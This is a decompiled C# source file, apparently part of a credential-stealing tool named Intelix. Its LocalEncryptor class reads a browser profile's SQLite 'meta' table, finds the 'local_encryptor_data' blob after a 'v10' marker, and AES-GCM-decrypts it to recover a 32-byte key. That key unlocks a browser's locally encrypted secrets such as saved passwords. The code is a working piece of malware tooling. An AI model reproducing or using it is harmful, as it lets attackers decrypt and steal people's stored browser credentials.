using System;
using System.Text;
using Intelix.Helper.Sql;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000073 RID: 115
	public static class LocalEncryptor
	{
		// Token: 0x060001C4 RID: 452 RVA: 0x00016510 File Offset: 0x00014710
		public static byte[] ExtractEncryptionKey(SqLite sql, byte[] encryptionKey)
		{
			byte[] array = new byte[0];
			bool flag = sql.ReadTable("meta");
			if (flag)
			{
				for (int i = 0; i < sql.GetRowCount(); i++)
				{
					bool flag2 = sql.GetValue(i, 0).Equals("local_encryptor_data");
					if (flag2)
					{
						array = Encoding.Default.GetBytes(sql.GetValue(i, 1));
						break;
					}
				}
			}
			int num = LocalEncryptor.FindByteSequence(array, Encoding.ASCII.GetBytes("v10"));
			bool flag3 = num == -1;
			byte[] result;
			if (flag3)
			{
				result = null;
			}
			else
			{
				byte[] array2 = new byte[96];
				Array.Copy(array, num + 3, array2, 0, 96);
				byte[] array3 = new byte[12];
				Array.Copy(array2, 0, array3, 0, 12);
				int num2 = array2.Length - 12 - 16;
				byte[] array4 = new byte[num2];
				Array.Copy(array2, 12, array4, 0, num2);
				byte[] array5 = new byte[16];
				Array.Copy(array2, array2.Length - 16, array5, 0, 16);
				byte[] array6 = AesGcm256.Decrypt(encryptionKey, array3, null, array4, array5);
				bool flag4 = BitConverter.ToInt32(array6, 0) == 538050824;
				if (flag4)
				{
					byte[] array7 = new byte[32];
					Array.Copy(array6, 4, array7, 0, 32);
					result = array7;
				}
				else
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x00016660 File Offset: 0x00014860
		private static int FindByteSequence(byte[] src, byte[] pattern)
		{
			int num = src.Length - pattern.Length + 1;
			for (int i = 0; i < num; i++)
			{
				bool flag = src[i] != pattern[0];
				if (!flag)
				{
					int num2 = pattern.Length - 1;
					while (num2 >= 1 && src[i + num2] == pattern[num2])
					{
						bool flag2 = num2 == 1;
						if (flag2)
						{
							return i;
						}
						num2--;
					}
				}
			}
			return -1;
		}
	}
}
